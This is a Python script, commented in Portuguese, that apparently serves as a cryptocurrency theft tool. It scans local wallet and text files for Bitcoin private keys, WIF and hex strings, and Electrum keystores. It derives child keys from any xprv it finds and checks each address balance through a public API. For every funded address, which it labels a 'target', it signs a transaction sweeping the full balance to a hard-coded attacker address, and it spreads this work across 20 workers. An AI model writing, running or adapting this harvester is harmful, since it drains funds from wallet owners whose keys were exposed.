import json
import re
import os
import requests
import time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = 20

def create_raw_tx(wif, balance_sats):
    """Cria e assina a transação para mover todo o saldo (Sweep)"""
    try:
        k = Key(wif, network='bitcoin')
        # Estimativa de taxa (25 sats/byte para garantir prioridade)
        fee = 2500 
        amount = balance_sats - fee
        
        if amount <= 546: # Dust limit
            return None
            
        # Criação da transação usando bitcoinlib
        t = Transaction(network='bitcoin')
        # Adiciona a entrada (o saldo atual)
        t.add_input(k.address(), balance_sats)
        # Adiciona a saída (seu endereço de destino)
        t.add_output(DEST_ADDRESS, amount)
        # Assina com a chave privada
        t.sign(k)
        
        return t.raw_hex()
    except Exception as e:
        return None

def check_balance_and_broadcast(priv_key_str, original_addr=None):
    try:
        k = Key(priv_key_str, network='bitcoin')
        # Formatos: Legacy (1...), P2SH (3...), SegWit (bc1...)
        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=witness_type)
            target = original_addr if (original_addr and witness_type is None) else addr
            
            # Rate limit preventer para não ser bloqueado pela API
            time.sleep(0.15)
            try:
                r = requests.get(f"https://mempool.space/api/address/{target}", timeout=10).json()
                stats = r.get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 1000: # Somente se houver saldo suficiente para taxas
                    print(f"🚨 ALVO DETECTADO: {target} | Saldo: {bal} sats")
                    
                    # GERA O HEX REAL ASSINADO
                    raw_hex = create_raw_tx(k.wif(), bal)
                    if raw_hex:
                        print(f"HEX_GEN:{raw_hex}")
                        return True
            except:
                continue
    except:
        pass
    return False

def process_file(file_path):
    print(f"🔍 ANALISANDO: {file_path}")
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
            
            # 1. Verificação de Formato JSON (Electrum)
            if '"keystore"' in content or '"keypairs"' in content:
                try:
                    data = json.loads(content)
                    if 'keypairs' in data:
                        for addr, priv in data['keypairs'].items():
                            if isinstance(priv, str) and priv.startswith(('L', 'K', '5')):
                                check_balance_and_broadcast(priv, addr)

                    if 'keystore' in data and 'xprv' in data['keystore']:
                        xprv = data['keystore']['xprv']
                        if xprv.startswith('xprv'):
                            master = Key(xprv)
                            # Varre 200 endereços para garantir que não perdeu o gap limit
                            for i in range(200):
                                child = master.subkey_for_path(f"0/{i}")
                                check_balance_and_broadcast(child.wif())
                except: pass

            # 2. Scanner de Texto Geral (WIFs e Hex)
            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
            hex_keys = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
            
            for key in set(wifs + hex_keys):
                check_balance_and_broadcast(key)
    except Exception as e:
        pass

if __name__ == "__main__":
    extensions = ('.wallet', '.txt', '.key', '.rtf', '.json')
    all_files = sorted([f for f in os.listdir('.') if f.endswith(extensions)])
    my_files = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
    
    print(f"🚀 WORKER {WORKER_ID} | PROCESSANDO {len(my_files)} ARQUIVOS")
    for f in my_files:
        process_file(f)
    print(f"✅ WORKER {WORKER_ID} FINALIZADO.")
